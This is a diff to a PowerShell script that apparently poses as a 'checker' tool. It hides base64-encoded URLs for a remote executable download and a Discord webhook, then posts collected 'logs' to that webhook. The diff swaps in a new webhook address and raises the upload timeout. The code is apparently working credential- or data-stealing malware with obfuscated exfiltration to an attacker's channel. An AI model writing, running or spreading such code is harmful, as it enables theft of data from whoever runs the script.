@@ -1,5 +1,6 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding = [System.Text.Encoding]::UTF8
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 chcp 65001 | Out-Null
 
 function p($a, $b = 600) {
@@ -15,7 +16,7 @@ function w($a)        { Write-Host " $a" -ForegroundColor Yellow }
 function s($a)        { Write-Host " $a" -ForegroundColor Red }
 
 $u1 = "aHR0cHM6Ly9naXRodWIuY29tL2dhbGFyb2wvY2hlY2tlci9yZWxlYXNlcy9kb3dubG9hZC8xMjMvMTIzLmV4ZQ=="
-$u2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MzQ2NzI4MzIxNTQ4Mjg4MS9SdGNBdk1lMkhnU3UzY2RGOStOZzM0aVlNaUp1VHZ3R2RoR2k3ZWswZjJvYkJpdFZUM18taVNrb0FXVFZjV182UDR0VGU="
+$u2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MzQ4MDU3OTU0MDk3OTczMi9kLVRpQUp6d1kycGpuMHRSVTdMTXFUYjNwd2wzSXI3M2ZsbVVHVlpoNXMzTVhCTndsQ0ZXdFNaTk1KaExfa19CamZIaQ=="
 
 $cfg = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u1))
 $wh  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u2))
@@ -198,7 +199,7 @@ try {
     } | ConvertTo-Json -Depth 10 -Compress
 
     $jb = [System.Text.Encoding]::UTF8.GetBytes($pl)
-    Invoke-RestMethod -Uri $wh -Method Post -Body $jb -ContentType 'application/json; charset=utf-8' -TimeoutSec 10
+    Invoke-RestMethod -Uri $wh -Method Post -Body $jb -ContentType 'application/json; charset=utf-8' -TimeoutSec 30
     Write-Host "  [+] Логи отправлены в Discord." -ForegroundColor Green
 } catch {
     Write-Host ""
